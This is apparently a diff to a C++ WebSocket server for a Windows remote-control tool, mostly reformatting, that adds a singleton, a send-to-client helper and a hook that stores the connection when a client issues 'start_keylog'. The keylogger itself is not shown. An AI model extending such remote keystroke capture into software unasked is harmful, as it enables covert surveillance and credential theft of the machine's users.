@@ -1,17 +1,19 @@
 #include "Server.h"
 
 #ifdef _WIN32
-    #include <winsock2.h>
-    #include <ws2tcpip.h>
-    #include <iphlpapi.h>
-    #pragma comment(lib, "Iphlpapi.lib")
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
+#pragma comment(lib, "Iphlpapi.lib")
 
-    #include <windows.h>
-    #include <objidl.h>
-    #include <gdiplus.h>
-    #pragma comment(lib, "Gdiplus.lib")
-    using namespace Gdiplus;
+#include <windows.h>
+#include <objidl.h>
+#include <gdiplus.h>
+#pragma comment(lib, "Gdiplus.lib")
+using namespace Gdiplus;
 #endif
+
+static RemoteServer* g_instance = nullptr;
 
 // Utility: lowercase string copy
 static std::string toLower(std::string s)
@@ -25,16 +27,17 @@ RemoteServer::RemoteServer()
 {
 #ifdef _WIN32
     GdiplusStartupInput gi;
-    if (GdiplusStartup((ULONG_PTR*)&m_gdiplusToken, &gi, nullptr) != Ok)
+    if (GdiplusStartup((ULONG_PTR *)&m_gdiplusToken, &gi, nullptr) != Ok)
         std::cerr << "[GDI+] Startup failed\n";
 #endif
+    g_instance = this;
 
     m_endpoint.init_asio();
     m_endpoint.clear_access_channels(websocketpp::log::alevel::all);
 
+    using websocketpp::lib::bind;
     using websocketpp::lib::placeholders::_1;
     using websocketpp::lib::placeholders::_2;
-    using websocketpp::lib::bind;
 
     m_endpoint.set_open_handler(bind(&RemoteServer::onOpen, this, _1));
     m_endpoint.set_close_handler(bind(&RemoteServer::onClose, this, _1));
@@ -56,24 +59,24 @@ std::string RemoteServer::getLocalIP()
 {
 #ifdef _WIN32
     ULONG size = 15000;
-    IP_ADAPTER_ADDRESSES* addrs = (IP_ADAPTER_ADDRESSES*)malloc(size);
+    IP_ADAPTER_ADDRESSES *addrs = (IP_ADAPTER_ADDRESSES *)malloc(size);
 
     if (GetAdaptersAddresses(AF_INET,
-        GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_MULTICAST,
-        nullptr, addrs, &size) != NO_ERROR)
+                             GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_MULTICAST,
+                             nullptr, addrs, &size) != NO_ERROR)
     {
         free(addrs);
         return "127.0.0.1";
     }
 
-    for (auto* a = addrs; a; a = a->Next)
+    for (auto *a = addrs; a; a = a->Next)
     {
         if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK || a->OperStatus != IfOperStatusUp)
             continue;
 
-        for (auto* u = a->FirstUnicastAddress; u; u = u->Next)
+        for (auto *u = a->FirstUnicastAddress; u; u = u->Next)
         {
-            auto* sa = (sockaddr_in*)u->Address.lpSockaddr;
+            auto *sa = (sockaddr_in *)u->Address.lpSockaddr;
             char ip[INET_ADDRSTRLEN];
             inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip));
             free(addrs);
@@ -112,7 +115,7 @@ void RemoteServer::run()
         // Run WebSocket loop
         m_endpoint.run();
     }
-    catch (const std::exception& e)
+    catch (const std::exception &e)
     {
         std::cerr << "[Server] ERROR: " << e.what() << "\n";
     }
@@ -135,6 +138,13 @@ void RemoteServer::onMessage(websocketpp::connection_hdl hdl, WsServer::message_
     try
     {
         json req = json::parse(msg->get_payload());
+
+        // Nếu client gửi lệnh start_keylog → lưu hdl
+        if (req.value("command", "") == "start_keylog")
+        {
+            ProcessHandlers::keylogHdl = hdl;
+        }
+
         json res = Router::dispatch(m_router, req);
         m_endpoint.send(hdl, res.dump(), msg->get_opcode());
     }
@@ -142,5 +152,19 @@ void RemoteServer::onMessage(websocketpp::connection_hdl hdl, WsServer::message_
     {
         m_endpoint.send(hdl, R"({"type":"error","message":"invalid json"})",
                         msg->get_opcode());
+    }
+}
+
+RemoteServer& RemoteServer::instance() {
+    return *g_instance;
+}
+
+void RemoteServer::sendToClient(websocketpp::connection_hdl hdl, const std::string& text)
+{
+    try {
+        m_endpoint.send(hdl, text, websocketpp::frame::opcode::text);
+    }
+    catch (...) {
+        // ignore errors
     }
 }
